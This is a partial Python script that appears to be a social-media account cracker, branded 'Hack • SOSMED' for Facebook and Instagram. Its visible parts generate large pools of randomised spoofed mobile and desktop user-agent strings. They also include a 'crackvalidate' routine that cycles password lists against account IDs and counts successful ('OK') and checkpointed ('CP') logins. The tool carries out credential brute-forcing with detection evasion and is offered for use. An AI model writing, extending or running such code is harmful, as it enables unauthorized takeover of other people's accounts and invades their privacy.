...
for xd in range(10000):
    ...
    smfb = random.choice(["SM-F721B","SM-M325FV","SM-A505FN ","SM-A235F","SM-A336B","SM-A505FN","SM-G955F","SM-A207F","SM-M315F","SM-A525F","SM-A715F","SM-A515F","SM-M526B","SM-S911B","SM-S326DL","SM-A505FN","SM-A750FN","SM-A245F","SM-S928B","SM-G965U","SM-G973F","SM-A202F","SM-G973F","SM-A546B","SM-A245F","SM-A505FN","SM-M536B","SM-S928B","SM-G781W","SM-A315F","SM-S236DL","SM-A207M","SM-G525F","SM-F721B","INE-LX1r"]) 
    realmi = random.choice(["RMX1931","RMX1971","RMX1945","RMX1911","RMX2030","RMX1941"]) 
    smrm = random.choice(["CPH2341","2201117PG","2203129G ","Redmi Note 8T","22101316UG","M2102J20SG","HD1913","CPH2363","M2004J19C","22126RN91Y","2109119DG","ATU-L31","ZTE Blade A51","2201116TGB","M2010J19CG","M2006C3MNG","CPH2363","CPH2341","XQ-DE54","M2101K7BNY","V2061","A063","SM-G973F","BE2013","M2006C3LG","AC2003","M2007J20CG","2112123AG","TECNO KI7","M2003J15SC","vivo 1920","22011119Uy","CPH2211","CPH2481","Infinix X682C"]) 
    buit1 = random.choice(["PPR1","PKQ1","TP1A","UKQ1","UP1A","SKQ1","QKQ1","RP1A","SQ3A","tkq1"])
    vivo = random.choice(["vivo 1951","vivo 1917","vivo 1935","vivo 1906","V2065","V2029","vivo 1920_20","V2027","vivo 1718","V2052","vivo 2004","V2205","vivo 1908","V2202","V1963A","V2201","V2104","vivo 1935","V2153","V2061","V2207","V2153","RMX1805","vivo 1611","V2158","V2036","vivo 1933","vivo 1811","V2153","vivo 1909","V2109","V2244A","vivo 2018","vivo 1915","V1981A","vivo X21A","V2027","vivo 1920","V2029","V2033","V2130","vivo 1940","V2116","V2020A","V2158","V2230A","V2055","V2149","V2068","V2027","V2054A","V2040","vivo 1935","V2185A","V2166BA","V2029","V2030","V2040","V2249","V2164KA"]) 
    id1 = random.choice(["ms-my","et-ee","hi-in","gu-in","en-us","en-au","en-gb"," en-nz","vi-vn","in-id","mr-in","ru-ru"]) 
    buit = random.choice(["PPR1","PKQ1"])
    strvgt1 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    strvgt2 = f"Mozilla/5.0 (Linux; Android {str(rr(1,30))}; {vivo}); wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(52,88))}.0.{str(rr(4280,4290))}.{str(rr(140,141))} Mobile Safari/537.36 VivoBrowser/{str(rr(8,17))}.{str(rr(1,10))}.{str(rr(2,10))}.{str(rr(3,10))}.{str(rr(1,8))}"
    strvgt3 = f"Mozilla/5.0 (Linux; Android {str(rr(1,30))}; {id1}); {realmi} Build/{buit}.{str(rr(180610,190626))}.{str(rr(1,11))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(52,88))}.0.{str(rr(2785,2875))}.{str(rr(134,135))} Mobile Safari/537.36 RealmeBrowser/{str(rr(30,35))}.{str(rr(5,5))}.0.{str(rr(8,8))}"
    strvgt4 = f"Mozilla/5.0 (Windows NT 10.0 {str(rr(1,30))}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,142))}.0.{str(rr(2125,7450))}.{str(rr(70,190))} Safari/537.36 Brave/{str(rr(1,149))}.0.{str(rr(2090,9980))}.{str(rr(10,210))}"
    strvgt5 = f"Mozilla/5.0 (Linux; Android {str(rr(8,14))}; {smfb} Build/{buit1}.{str(rr(150000,230000))}.{str(rr(1,20))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,142))}.0.{str(rr(2125,7450))}.{str(rr(70,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(350,550))}.{str(rr(1,5))}.0.{str(rr(20,55))};{str(rr(30,130))}"
    strvgt6 = f"Mozilla/5.0 (Linux; Android {str(rr(8,14))}; {smrm} Build/{buit1}.{str(rr(150000,230000))}.{str(rr(1,20))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,142))}.0.{str(rr(2125,7450))}.{str(rr(70,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(350,550))}.{str(rr(1,5))}.0.{str(rr(20,55))};{str(rr(30,130))}"
    strvgt7 = f"Mozilla/5.0 (Windows NT 10.0 {str(rr(1,30))}; {str(rr(1,30))};  WOW64){buit} AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(98,142))}.0.{str(rr(2125,7450))}.{str(rr(70,190))} Safari/537.36 Vivaldi/6.0.2979.18"
    uateddy = random.choice([strvgt1,strvgt2,strvgt3,strvgt3,strvgt4,strvgt5,strvgt6,strvgt7])
    ugen.append(uateddy)
...
def banner():
 ...
 ╚═╝┴ ┴┘└┘└─┘┴ ┴┴ ┴  └─┘└─┘┴─┘┴ ┴ └─┘┘└┘└─┘
   {b}   Ｈａｃｋ  {p}   •  {k} ＳＯＳＭＥＤ
{b}𝖀𝖕𝖉𝖆𝖙𝖊   : {hijo}𝙰𝚕𝚎𝚡•𝙶𝚊𝚗𝚜    {b}𝕱𝖆𝖈𝖊𝖇𝖔𝖔𝖐 : {hijo}𝙰𝚕𝚎𝚡 𝚐𝚊𝚗𝚜
{b}𝕾𝖈𝖗𝖎𝖕𝖙 : {hijo}𝙵𝙱•𝙸𝙶     {b}𝕴𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒    : {hijo}𝕬𝖑𝖊𝖝_𝕲𝖆𝖓𝖘_23
{b}𝕾𝖙𝖆𝖙𝖚𝖘   : {hijo}𝙿𝚛𝚎𝚖𝚒𝚞𝚖       {b}Version  : {hijo}1.2.2                ''')
#kukis
def login():
	os.system('clear')
	banner()
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r[bold green]alex<->gans[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
